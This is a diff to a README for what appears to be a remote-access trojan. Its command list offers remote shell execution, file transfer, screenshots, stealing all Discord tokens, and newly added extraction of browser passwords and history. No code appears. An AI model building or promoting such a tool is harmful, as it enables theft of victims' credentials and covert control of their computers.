@@ -7,20 +7,22 @@ Supports multiple exploitation commands.
 
 # Features
 
-    !help - Help command
-    !ping - Ping command
-    !cd <path> - Change directory
-    !ls - List directory
-    !download <file> - Download file
-    !upload <link> - Upload file
-    !shell <ps> - Execute shell command
-    !run <file> - Run an file
-    !exit - Exit the session
-    !screenshot - Take a screenshot
-    !tokens - Get all discord tokens
-    !startup - Add to startup
-    !shutdown - Shutdown the computer
-    !restart - Restart the computer
+    help - Help command
+    ping - Ping command
+    cwd - Get current working directory
+    cd <path> - Change directory
+    ls - List directory
+    download <file> - Download file
+    upload <link> - Upload file
+    shell <ps> - Execute shell command
+    run <file> - Run an file
+    exit - Exit the session
+    screenshot - Take a screenshot
+    tokens - Get all discord tokens
+    shutdown - Shutdown the computer
+    restart - Restart the computer
+    passwords - Extracts all browser passwords
+    history - Extracts all browser history
 
 # Setup
 
